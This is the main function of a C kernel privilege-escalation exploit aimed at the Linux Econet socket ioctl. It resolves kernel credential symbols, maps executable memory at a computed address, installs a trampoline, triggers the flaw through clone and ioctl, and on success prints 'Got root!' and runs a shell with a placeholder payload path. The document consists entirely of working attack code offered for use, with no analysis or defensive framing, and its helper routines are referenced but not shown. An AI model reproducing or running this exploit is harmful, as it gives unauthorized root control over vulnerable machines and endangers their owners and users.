int main(int argc, char * argv[])
{
       unsigned long econet_ops, econet_ioctl, target, landing;
       int fildes[4], pid;
       void * newstack, * payload;

       /* Create file descriptors now so there are two
          references to them after cloning...otherwise
          the child will never return because it
          deadlocks when trying to unlock various
          mutexes after OOPSing */
       pipe(fildes);
       fildes[2] = socket(PF_ECONET, SOCK_DGRAM, 0);
       fildes[3] = open("/dev/zero", O_RDONLY);

       if(fildes[0] < 0 || fildes[1] < 0 || fildes[2] < 0 || fildes[3] < 0) {
               printf("[*] Failed to open file descriptors.\n");
               return -1;
       }

       /* Resolve addresses of relevant symbols */
       printf("[*] Resolving kernel addresses...\n");
       econet_ioctl = get_kernel_sym("econet_ioctl");
       econet_ops = get_kernel_sym("econet_ops");
       commit_creds = (_commit_creds) get_kernel_sym("commit_creds");
       prepare_kernel_cred = (_prepare_kernel_cred) get_kernel_sym("prepare_kernel_cred");

       if(!econet_ioctl || !commit_creds || !prepare_kernel_cred || !econet_ops) {
               printf("[*] Failed to resolve kernel symbols.\n");
               return -1;
       }

       if(!(newstack = malloc(65536))) {
               printf("[*] Failed to allocate memory.\n");
               return -1;
       }

       printf("[*] Calculating target...\n");
       target = econet_ops + 10 * sizeof(void *) - OFFSET;

       /* Clear the higher bits */
       landing = econet_ioctl << SHIFT >> SHIFT;

       payload = mmap((void *)(landing & ~0xfff), 2 * 4096,
                      PROT_READ | PROT_WRITE | PROT_EXEC,
                      MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, 0, 0);

       if ((long)payload == -1) {
               printf("[*] Failed to mmap() at target address.\n");
               return -1;
       }

       memcpy((void *)landing, &trampoline, 1024);

       clone((int (*)(void *))trigger,
             (void *)((unsigned long)newstack + 65536),
             CLONE_VM | CLONE_CHILD_CLEARTID | SIGCHLD,
             &fildes, NULL, NULL, target);

       sleep(1);

       printf("[*] Triggering payload...\n");
       ioctl(fildes[2], 0, NULL);

       if(getuid()) {
               printf("[*] Exploit failed to get root.\n");
               return -1;
       }

       printf("[*] Got root!\n");
       execl("/bin/sh","/bin/sh","-c","__PAYLOAD_PATH__",NULL);
}